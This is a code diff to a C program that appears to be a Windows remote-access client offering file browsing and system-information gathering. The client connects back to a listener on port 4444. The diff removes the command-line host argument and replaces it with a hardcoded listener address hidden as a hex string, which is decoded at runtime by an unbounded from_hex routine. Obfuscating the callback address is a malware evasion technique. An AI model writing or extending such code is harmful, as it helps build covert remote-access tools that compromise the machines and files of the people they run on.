@@ -18,6 +18,14 @@
 #define BUFFER_SIZE 16384
 #define DEFAULT_PORT 4444
 
+void from_hex(const char *hex, unsigned char *out) {
+    while (*hex) {
+        sscanf(hex, "%2hhx", out);
+        hex += 2;
+        out++;
+    }
+}
+
 void get_os_info(char *output, size_t size) {
     OSVERSIONINFOEX osvi;
     SYSTEM_INFO si;
@@ -382,8 +390,9 @@ int connect_to_listener(const char *host, int port) {
 
 int main(int argc, char *argv[]) {
     char *host;
+    unsigned char HOST[256] = {0};
     int port = DEFAULT_PORT;
-    
+/*    
     if (argc < 2) {
         printf("Usage: %s <listener_ip> [port]\n", argv[0]);
         printf("Example: %s 192.168.1.100 4444\n", argv[0]);
@@ -394,7 +403,13 @@ int main(int argc, char *argv[]) {
     if (argc > 2) {
         port = atoi(argv[2]);
     }
+*/    
     
+    const char *hex = "3139322E3136382E3132322E31";
+    from_hex(hex, HOST);
+
+    host = HOST;
+
     printf("========================================\n");
     printf("Windows Client - Version 3\n");
     printf("File Browser + System Info\n");
